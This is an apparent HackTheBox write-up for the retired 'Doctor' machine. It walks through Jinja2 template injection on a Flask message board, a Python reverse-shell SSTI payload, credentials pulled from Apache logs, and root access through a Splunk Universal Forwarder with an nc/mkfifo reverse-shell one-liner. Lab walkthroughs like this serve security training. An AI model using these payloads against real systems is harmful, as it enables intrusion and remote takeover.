# Doctor
## Linux
### HackTheBox
### Easy (retired)

IP: 10.129.242.87 
Host: www.doctors.htb, doctors.htb

### NMAP
```console
22/tcp ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp http Apache httpd 2.4.41 ((Ubuntu))
  http-server-header:
    Apache/2.4.41 (Ubuntu)
    Werkzeug/1.0.1 Python/3.8.2
  http-methods:
    Supported Methods: OPTIONS GET HEAD
  http-title: Doctor Secure Messaging - Login
  Requested resource was http://doctors.htb/login?next=%2F
8089/tcp open  ssl/http syn-ack ttl 63 Splunkd httpd
  http-server-header: Splunkd
  http-title: splunkd
  ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
  Issuer: commonName=SplunkCommonCA/organizationName=Splunk/stateOrProvinceName=CA/countryName=US/localityName=San Francisco/emailAddress=support@splunk.com
  http-methods:
    Supported Methods: GET HEAD OPTIONS
  http-robots.txt: 1 disallowed entry
  /
```

### Directories
```Console
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://doctors.htb
 📖  Wordlist              │ /SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💾  Output File           │ dirs/doctorsDirs.log
 💲  Extensions            │ [php, txt, html]
───────────────────────────┴──────────────────────
200       95l      228w     4204c http://doctors.htb/login
200      101l      238w     4493c http://doctors.htb/register
200        6l        8w      101c http://doctors.htb/archive
302        4l       24w      245c http://doctors.htb/home
302        4l       24w      251c http://doctors.htb/account
302        4l       24w      217c http://doctors.htb/logout
200       77l      187w     3493c http://doctors.htb/reset_password
403        9l       28w      276c http://doctors.htb/server-status
```

### Subdirectories
```Console
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://doctors.htb/
=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000001:   302        3 L      24 W       237 Ch      "www"
```

```Console
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.129.2.21
+ Target Hostname:    doctors.htb
+ Target Port:        80
---------------------------------------------------------------------------
+ Server: Werkzeug/1.0.1 Python/3.8.2
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Root page / redirects to: http://doctors.htb/login?next=%2F
+ Server banner has changed from 'Werkzeug/1.0.1 Python/3.8.2' to 'Apache/2.4.41 (Ubuntu)' which may suggest a WAF, load balancer or proxy is in place
```

### www.doctors.htb
__Directories__
```Console
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://www.doctors.htb
 📖  Wordlist              │ /SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💾  Output File           │ wwwDoctorsDirs.log
 💲  Extensions            │ [php, html, txt, xml]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
302        4l       24w      251c http://www.doctors.htb/account
200        6l        8w      101c http://www.doctors.htb/archive
200       95l      228w     4204c http://www.doctors.htb/login
200      101l      238w     4493c http://www.doctors.htb/register
302        4l       24w      245c http://www.doctors.htb/home
302        4l       24w      217c http://www.doctors.htb/logout
200       77l      187w     3493c http://www.doctors.htb/reset_password
403        9l       28w      280c http://www.doctors.htb/server-status
```
* Found this in the source code of http://www.doctors.htb/login?next=%2Fhome
`<!--archive still under beta testing<a class="nav-item nav-link" href="/archive">Archive</a>-->`
```Console
╰─❯ curl doctors.htb/archive

	<?xml version="1.0" encoding="UTF-8" ?>
	<rss version="2.0">
	<channel>
 	<title>Archive</title>
```

* Created a test account on this website
  * routes to http://www.doctors.htb/home
  * Renders the text in an `href`:
```html
<a class="mr-2" href="/user/test">test</a>
	<small class="text-muted"></small>
```
```html
<h2><a class="article-title" href="/post/3">Test Title</a></h2>
  <p class="article-content">Test Content</p>
```
Site allows for input to create a message with the following fields: 'Title' and 'Content'. Based on what shows in the output of `/archive`, it renders the title provided to the `<title>` tag from the Title input on the page.

Tested SSTI in the Title section: `{{7 * 7}}`. Checked `/archive` again and received the following:
```xml
<?xml version="1.0" encoding="UTF-8" ?>
	<rss version="2.0">
	<channel>
 	<title>Archive</title>
 	<item><title>Test</title></item>

			</channel>
			<item><title>49</title></item>

			</channel>
```
If I change the SSTI test to `{{7 * '7'}}` it should execute the command and repeat the string '7' seven times. Checked `/archive`:
```xml
<?xml version="1.0" encoding="UTF-8" ?>
	<rss version="2.0">
	<channel>
 	<title>Archive</title>
 	<item><title>7777777</title></item>

			</channel>
```
It's rendering the SSTI payload as expected. With that in mind, let's see what other information we can get.

Found an [SSTI cheat sheet](https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti) for other payloads to test.
> You may conduct introspection with the locals object using dir and help to see everything that is available to the template context. You can
> also use introspection to reach every other application variable. This script written by the DoubleSigma team will traverse over child
> attributes of request recursively. For example, if you need to reach the blacklisted config var you may access it anyway via:
`{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config['FLAG']}}`

This returns the following error on the `/archive` page: 
> Something went wrong (500)
> 
> We're experiencing some trouble on our end. Please try again in the near future

Unfortunately, I have to wait until the messaging system resets because it stores everything from any user and renders the 500 error.

Get all classes:
`{{ [].class.base.subclasses() }}`

Also found this on [HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
```python
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"IP\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
```

This is a reverse shell paylod. I just have to add my IP address at the `s.connect((\"IP\",444))` portion with an open `netcat` listener on
port 4444 (or any port I would like) and should hopefully get shell access to machine.

>>>> _20 minutes later_ <<<<
```python
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"IP\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
```

Modified the payload:
```python
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"10.10.14.77\",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/bash\", \"-i\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
```
__Changes:__
1. Changed the IP to my IP address. changed the `p=subprocess.call` to `/bin/bash`
2. Replaced "flag.txt" with the `-i` option

Got shell as:
```Console
web@doctor:~$ id
uid=1001(web) gid=1001(web) groups=1001(web),4(adm)
web@doctor:~$
```

### web@doctor / PrivEsc
Checked the immediate directory:
```Console
web@doctor:~$ ls -la
total 48
drwxr-xr-x 6 web  web  4096 Sep 28  2020 .
drwxr-xr-x 4 root root 4096 Sep 19  2020 ..
lrwxrwxrwx 1 web  web     9 Jul 26  2020 .bash_history -> /dev/null
-rw-r--r-- 1 web  web   220 Jul 20  2020 .bash_logout
-rw-r--r-- 1 web  web  3771 Jul 20  2020 .bashrc
drwxr-xr-x 3 web  web  4096 Sep 22  2020 blog
-rwxrwxr-x 1 web  web   135 Jul 26  2020 blog.sh
drwxrwxr-x 5 web  web  4096 Jul 27  2020 .cache
drwxr-xr-x 4 web  web  4096 Jul 27  2020 .config
drwxrwxr-x 5 web  web  4096 Jul 26  2020 .local
-rw-r--r-- 1 web  web   807 Jul 20  2020 .profile
-rw------- 1 web  web   177 Jul 27  2020 .python_history
-rw-rw-r-- 1 web  web    66 Jul 26  2020 .selected_editor
```

Checked the `blog` directory first. Moved into `flaskblog` directory:
```Console
web@doctor:~/blog/flaskblog$ ls -la
total 88
drwxr--r-- 10 web web  4096 Okt 24 00:14 .
drwxr-xr-x  3 web web  4096 Sep 22  2020 ..
-rwxr--r--  1 web web   302 Sep  5  2020 config.py
drwxr--r--  3 web web  4096 Jul 27  2020 errors
-rwxr--r--  1 web web   904 Jul 26  2020 __init__.py
drwxr--r--  3 web web  4096 Sep 22  2020 main
-rwxr--r--  1 web web  1678 Jul 21  2020 models.py
drwxr--r--  3 web web  4096 Sep 22  2020 posts
drwxrwxr-x  2 web web  4096 Sep  5  2020 __pycache__
-rw-r--r--  1 web web 36864 Okt 24 00:14 site.db
drwxr--r--  3 web web  4096 Sep 23  2020 static
drwxr--r--  3 web web  4096 Sep 23  2020 templates
drwxr--r--  3 web web  4096 Jul 21  2020 tmp
drwxr--r--  3 web web  4096 Sep 23  2020 users
```

`site.db` looks interesting...
```Console
web@doctor:~/blog/flaskblog$ cat site.db
��u�MtablepostpostCREATE TABLE post (
	id INTEGER NOT NULL,
	title VARCHAR(100) NOT NULL,
	date_posted DATETIME NOT NULL,
	content TEXT NOT NULL,
	user_id INTEGER NOT NULL,
	PRIMARY KEY (id),
	FOREIGN KEY(user_id) REFERENCES user (id)
)�~�_tableuseruserCREATE TABLE user (
	id INTEGER NOT NULL,
	username VARCHAR(20) NOT NULL,
	email VARCHAR(120) NOT NULL,
	image_file VARCHAR(20) NOT NULL,
	password VARCHAR(60) NOT NULL,
	PRIMARY KEY (id),
	UNIQUE (username),
	UNIQUE (email)
:�:��wd_'#�testtest@test.comdefault.gif$2b$12$jtQalxsL7pUnKZSgwoOGx.0rsAWWvd4aGOR8qfAEIn/TmM8cH11qic-#�adminadmin@doctor.htbdefault.gif$2b$12$Tg2b8u/elwAyfQOvqvxJgOTcsbnkFANIDdv6jVXmxiWsg4IznjI0S
����#	TestUse
test    admin
�DDDDDDD��O�[A{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"10.10.14.77\",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/bash\", \"-i\"]);'").read().zfill(417)}}{%endif%}{% endfor %}2021-10-23 22:24:46.864956Hello!Z#?m	Doctor blog2020-09-18 20:48:37.55555A free blog to share medical knowledge. Be kind!
```

Hash! Based on the table listed above:
username:admin
e-mail: admin@doctor.htb
image_file: default.gif
Password: $2b$12$Tg2b8u/elwAyfQOvqvxJgOTcsbnkFANIDdv6jVXmxiWsg4IznjI0S

This is a dead end. Can't identify the hash. Found this in the `/var/logs` as seen below:
```Console
web@doctor:~/blog/flaskblog$ cat /etc/passwd | grep 'bash'
cat /etc/passwd | grep 'bash'
root:x:0:0:root:/root:/bin/bash
web:x:1001:1001:,,,:/home/web:/bin/bash
shaun:x:1002:1002:shaun,,,:/home/shaun:/bin/bash
splunk:x:1003:1003:Splunk Server:/opt/splunkforwarder:/bin/bash
```
We have a user: `shaun`

Used `grep -R -e 'password'` in `/var/logs` and found this line:
```Console
/var/log/apache2/backup:10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] "POST /reset_password?email=Guitar123" 500 453 "http://doctor.htb/reset_password"
```

We have credentials!
User: shaun
Password: Guitar123

`su shaun` and entered password and reached a dummy shell. Used `python -c 'import pty;pty.spawn("/bin/bash")'` to get interactive shell.
Right at that time, the shell died because there appears to be a script that removes the new users every 20 minutes. Logged back in and 
switched to the shaun user which avoids that issue. Spawned an interactive shell with the method above.

I also obtained `user.txt`:
User flag: 12a[oooooo~[takeAbreath]~oooooo]
### Privesc
* Shaun can't use `sudo`.
* Checked netstat
```Console
shaun@doctor:~$ netstat -ant
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
<----Snip---->
tcp        0      0 0.0.0.0:8089            0.0.0.0:*               LISTEN
```

There's a listener on port 8089. Going back to the results from `nmap`, it found the following:
```Console
8089/tcp ssl/http Splunkd httpd
  http-server-header: Splunkd
  http-title: splunkd
  ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
  Issuer: commonName=SplunkCommonCA/organizationName=Splunk/stateOrProvinceName=CA/countryName=US/localityName=San Francisco/emailAddress=support@splunk.com
```

Found [this blog](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/) about the vulnerability of the
Splunk service on port 8089:
> Splunk is a data aggregation and search tool often used as a Security Information and Event Monitoring (SIEM) system. Splunk Enterprise
> Server is a web application which runs on a server, with agents, called Universal Forwarders, which are installed on every system in the
> network. Splunk provides agent binaries for Windows, Linux, Mac, and Unix. Many organizations use Syslog to send data to Splunk instead of
> installing an agent on Linux/Unix hosts but agent installation is becomming increasingly popular.
> 
> Universal Forwarder is accessible on each host at https://host:8089. Accessing any of the protected API calls, such as /service/ pops up a
> Basic authentication box. The username is always admin, and the password default used to be changeme until 2016when Splunk required any new
> installations to set a password of 8 characters or higher. As you will note in my demo, complexity is not a requirement as my agent password
> is 12345678. A remote attacker can brute force the password without lockout, which is a necessity of a log host, since if the account locked
> out then logs would no longer be sent to the Splunk server and an attacker could use this to hide their attacks.
...
> I often find the Splunk Universal Forwarding agent plain text password in the following locations on networks:
> 
>     Active Directory Sysvol/domain.com/Scripts directory. Administrators store the executible and the password together for efficient agent
> installation.
>     Network file shares hosting IT installation files
>     Wiki or other build note repositories on internal network
> 
> The password can also be accessed in hashed form in Program Files\Splunk\etc\passwd on Windows hosts, and in /opt/Splunk/etc/passwd on Linux
> and Unix hosts.

Checked `/opt/Splunk/etc/passwd` but `shaun` does not have access to this file.

I found [this GitHub repo](https://github.com/cnotin/SplunkWhisperer2) to exploit Splunk as well.
> Local privilege escalation, or remote code execution, through Splunk Universal Forwarder (UF) misconfigurations

```Console
shaun@doctor:/opt/splunkforwarder$ ps aux | grep 'splunk'
root        1167  0.1  2.1 259516 85380 ?        Sl   00:08   0:04 splunkd -p 8089 start
root        1168  0.0  0.3  77664 13388 ?        Ss   00:08   0:00 [splunkd pid=1167] splunkd -p 8089 start [process-runner]
```
 * the Splunk process is running on port 8089 by `root`

Ran the python version of `SplunkWhisperer2` with the payload of `id` and got the following:
```Console
╰─❯ python3 PySplunkWhisperer2_remote.py --host 10.129.242.87 --lhost 10.10.14.77 --payload id
Running in remote mode (Remote Code Execution)
[.] Authenticating...
Authentication failure

<?xml version="1.0" encoding="UTF-8"?>
<response>
  <messages>
    <msg type="ERROR">Unauthorized</msg>
  </messages>
</response>
```
 * try this but with the credentials obtained for `shaun`
``` Console
╰─❯ python3 PySplunkWhisperer2_remote.py --host doctors.htb --port 8089 --lhost 10.10.14.77 --username shaun --password Guitar123 --payload id
Running in remote mode (Remote Code Execution)
[.] Authenticating...
[+] Authenticated
[.] Creating malicious app bundle...
[+] Created malicious app bundle in: /var/folders/dk/9d8l_p0j7w9c13sv5x_tpz7w0000gq/T/tmp5vcd7ima.tar
[+] Started HTTP server for remote mode
[.] Installing app from: http://10.10.14.77:8181/
10.129.242.87 - - [23/Oct/2021 18:14:39] "GET / HTTP/1.1" 200 -
[+] App installed, your code should be running now!
```

This is a good setup to run a reverse shell as root. Adding payload:
`'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.77 4242 >/tmp/f'`

Set up `netcat` listener beforehand and ran the exploit

```Console
# id
uid=0(root) gid=0(root) groups=0(root)
```

Root flag: 5d3[oooooo~[takeAbreath]~oooooo]

Pwned by:
```ascii
                                                                                                                             
                       *                          **          *                                                      *       
    *                **                        *****        **                                               *     **        
   **                **                       *  ***        **                                              **     **        
   **                **                          ***        **                                              **     **        
 ********            **                         *  **       **         ***  ****                          ******** **        
********     ****    **  ***       ***          *  **       ** ****     **** **** *    ***       ****    ********  **  ***   
   **       * ***  * ** * ***     * ***        *    **      *** ***  *   **   ****    * ***     * ***  *    **     ** * ***  
   **      *   ****  ***   *     *   ***       *    **      **   ****    **          *   ***   *   ****     **     ***   *** 
   **     **    **   **   *     **    ***     *      **     **    **     **         **    *** **    **      **     **     ** 
   **     **    **   **  *      ********      *********     **    **     **         ********  **    **      **     **     ** 
   **     **    **   ** **      *******      *        **    **    **     **         *******   **    **      **     **     ** 
   **     **    **   ******     **           *        **    **    **     **         **        **    **      **     **     ** 
   **     **    **   **  ***    ****    *   *****      **   **    **     ***        ****    * **    **      **     **     ** 
    **     ***** **  **   *** *  *******   *   ****    ** *  *****        ***        *******   ***** **      **    **     ** 
            ***   **  **   ***    *****   *     **      **    ***                     *****     ***   **            **    ** 
                                          *                                                                               *  
                                           **                                                                            *   
                                                                                                                        *    
                                                                                                                       *     
```
